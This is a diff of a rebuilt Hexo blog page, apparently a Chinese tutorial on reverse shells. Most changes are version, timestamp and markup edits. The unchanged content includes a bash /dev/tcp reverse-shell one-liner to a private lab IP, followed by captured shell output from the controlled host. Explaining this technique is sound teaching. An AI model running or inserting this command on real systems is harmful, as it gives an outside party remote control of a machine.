@@ -18,7 +18,7 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 </script>    <meta name="msvalidate.01" content="D8350FC7417B692DE23E5326C13202D3" />
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 8.1.2"></head>
 <body class="wave">
     <nav class="navbar blog-header navbar-expand-lg ">
         <div class="container-fluid">
@@ -54,7 +54,7 @@ var _hmt = _hmt || [];
     </div>
     <div class="blog-post-meta">
         
-        <span class="post-time">更新于：2026-03-31 10:54:02</span>
+        <span class="post-time">更新于：2026-07-16 18:34:01</span>
         
         <span class="post-time">发布于：2021-01-27 23:26:09</span>
     </div>
@@ -67,13 +67,9 @@ var _hmt = _hmt || [];
       </div>
       <p>如果我们需要到服务器上执行 Shell 命令，但是因为防火墙等原因，无法由客户端主动发起连接的情况，就可以使用反弹 Shell 来满足登陆和操作的需求。</p>
 <h2 id="什么是反弹Shell"><a href="#什么是反弹Shell" class="headerlink" title="什么是反弹Shell"></a>什么是反弹Shell</h2><p>正常情况下，我们登陆服务器获取 Shell 会话是下面的步骤，用户在终端软件（Terminal）中输入 <code>ssh root@ip</code> 登陆目标机器，登陆成功后即可以开始Shell操作。</p>
-<img src="/2021/01/27/20210129-reverse-shell/image-20210128083442895.png" class="" title="image-20210128083442895">
-
+<p><img src="/20210129-reverse-shell/image-20210128083442895.png" alt="image-20210128083442895"></p>
 <p>反弹Shell（Reverse Shell），顾名思义是指与正常的 sshd 服务相反，由控制端监听，被控制端发起请求到监听端口，并将其命令行的输入输出转到控制端。</p>
-<img src="/2021/01/27/20210129-reverse-shell/image-20210129080743429.png" class="" title="image-20210129080743429">
-
-
-
+<p><img src="/20210129-reverse-shell/image-20210129080743429.png" alt="image-20210129080743429"></p>
 <h2 id="实战介绍"><a href="#实战介绍" class="headerlink" title="实战介绍"></a>实战介绍</h2><p>准备两台网络连通的服务器：</p>
 <ul>
 <li>控制端：172.16.51.130</li>
@@ -86,7 +82,7 @@ var _hmt = _hmt || [];
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/172.16.51.130/8888 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p>这时注意观察控制端，会出现被控端的 shell 提示符</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">172.16.51.128: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [172.16.51.130] from (UNKNOWN) [172.16.51.128] 47584</span><br><span class="line">tiago@lampiao:~$ whoami</span><br><span class="line">whoami</span><br><span class="line">tiago</span><br><span class="line">tiago@lampiao:~$ hostname</span><br><span class="line">hostname</span><br><span class="line">lampiao</span><br><span class="line">tiago@lampiao:~$ ip addr</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:cc:9b:c6 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.16.51.128/24 brd 172.16.51.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fecc:9bc6/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">172.16.51.128: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [172.16.51.130] from (UNKNOWN) [172.16.51.128] 47584</span><br><span class="line">tiago@lampiao:~$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">tiago</span><br><span class="line">tiago@lampiao:~$ hostname</span><br><span class="line">hostname</span><br><span class="line">lampiao</span><br><span class="line">tiago@lampiao:~$ ip addr</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:cc:9b:c6 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.16.51.128/24 brd 172.16.51.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fecc:9bc6/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
 
 <p>在提示符下输入命令，可以看到确实是在被管机上执行的命令及返回的结果，就像我们登陆到了被管机一样。</p>
 <p>具体解释如下：</p>
@@ -137,7 +133,7 @@ var _hmt = _hmt || [];
 
     <div class="author-desc">
         <h1>cocowool</h1>
-        <p>A FULL STACK DREAMER!</p>
+        <p>A full-stack dreamer!</p>
     </div>
 </div>
                 </div>
